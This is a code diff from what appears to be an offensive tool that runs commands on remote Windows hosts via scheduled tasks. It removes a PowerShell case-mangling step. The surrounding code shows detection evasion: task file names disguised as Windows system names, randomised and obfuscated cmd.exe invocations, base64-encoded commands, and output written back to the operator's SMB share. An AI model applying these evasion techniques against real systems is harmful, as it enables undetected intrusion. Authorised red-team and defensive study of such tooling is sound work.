@@ -84,12 +84,6 @@ class TSCH_EXEC:
 
     # ----------------------------------------------------------------------
     def gen_xml(self, command, fileless=False):
-        safer_command = command
-
-        if "powershell" in command.lower() and ("-command" in command.lower() or "-c " in command.lower()):
-            self.logger.debug("PowerShell command detected, keeping as is (user requested)")
-            safer_command = command.replace("powershell", "poWerSheLL").replace("POWERSHELL", "PoWeRsHeLL")
-
         valid_system_filename_prefixes = [
             "DiagTrack-", "CompatTel-", "WindowsUpdate-", "NetTrace-",
             "Defender-", "SIH-", "WER-", "Cluster-", "ws_trace-",
@@ -111,9 +105,9 @@ class TSCH_EXEC:
         if self.__retOutput:
             if fileless:
                 local_ip = self.__connection.local_ip
-                ps_cmd = f"[IO.File]::WriteAllText('\\\\{local_ip}\\{self.__connection.smb_share_name}\\{legit_filename}', (& {{ {safer_command} }}))"
+                ps_cmd = f"[IO.File]::WriteAllText('\\\\{local_ip}\\{self.__connection.smb_share_name}\\{legit_filename}', (& {{ {command} }}))"
             else:
-                ps_cmd = f"[IO.File]::WriteAllText('{output_windows_path}', (& {{ {safer_command} }}))"
+                ps_cmd = f"[IO.File]::WriteAllText('{output_windows_path}', (& {{ {command} }}))"
         else:
             # Optional obfuscation: randomize cmd path and args
             random_cmd_path = [
@@ -123,7 +117,7 @@ class TSCH_EXEC:
                 "C:\\Windows\\System32\\..\\System32\\cmd.exe",
             ]
             random_cmd_arg = ["/c", "/C", "/Q /c", "/F:ON /c"]
-            ps_cmd = f"{random.choice(random_cmd_path)} {random.choice(random_cmd_arg)} {safer_command}"
+            ps_cmd = f"{random.choice(random_cmd_path)} {random.choice(random_cmd_arg)} {command}"
 
         b64 = base64.b64encode(ps_cmd.encode("utf-16le")).decode()
 
